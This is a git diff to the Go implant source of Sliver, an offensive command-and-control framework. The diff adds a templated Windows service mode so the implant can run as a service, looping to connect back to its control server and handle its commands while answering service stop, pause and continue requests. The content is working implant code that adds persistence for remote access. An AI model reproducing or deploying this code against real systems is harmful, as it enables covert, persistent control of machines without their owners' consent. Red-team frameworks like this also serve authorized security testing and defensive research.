@@ -44,7 +44,45 @@ import (
 	"github.com/bishopfox/sliver/sliver/version"
 
 	"github.com/golang/protobuf/proto"
+
+	// {{if .IsService}}
+	"golang.org/x/sys/windows/svc"
+	// {{end}}
 )
+
+// {{if .IsService}}
+
+type sliverService struct{}
+
+func (serv *sliverService) Execute(args []string, r <-chan svc.ChangeRequest, changes chan<- svc.Status) (ssec bool, errno uint32) {
+	const cmdsAccepted = svc.AcceptStop | svc.AcceptShutdown | svc.AcceptPauseAndContinue
+	changes <- svc.Status{State: svc.Running, Accepts: cmdsAccepted}
+	for {
+		select {
+		default:
+			connection := transports.StartConnectionLoop()
+			if connection == nil {
+				break
+			}
+			mainLoop(connection)
+		case c := <-r:
+			switch c.Cmd {
+			case svc.Interrogate:
+				changes <- c.CurrentStatus
+			case svc.Stop, svc.Shutdown:
+				changes <- svc.Status{State: svc.Stopped, Accepts: cmdsAccepted}
+			case svc.Pause:
+				changes <- svc.Status{State: svc.Paused, Accepts: cmdsAccepted}
+			case svc.Continue:
+				changes <- svc.Status{State: svc.Running, Accepts: cmdsAccepted}
+			default:
+			}
+		}
+	}
+	return
+}
+
+// {{end}}
 
 // {{if .IsSharedLib}}
 
@@ -98,6 +136,9 @@ func main() {
 
 	limits.ExecLimits() // Check to see if we should execute
 
+	// {{if .IsService}}
+	svc.Run(os.Args[1], &sliverService{})
+	// {{else}}
 	for {
 		connection := transports.StartConnectionLoop()
 		if connection == nil {
@@ -105,6 +146,7 @@ func main() {
 		}
 		mainLoop(connection)
 	}
+	// {{end}}
 }
 
 func mainLoop(connection *transports.Connection) {
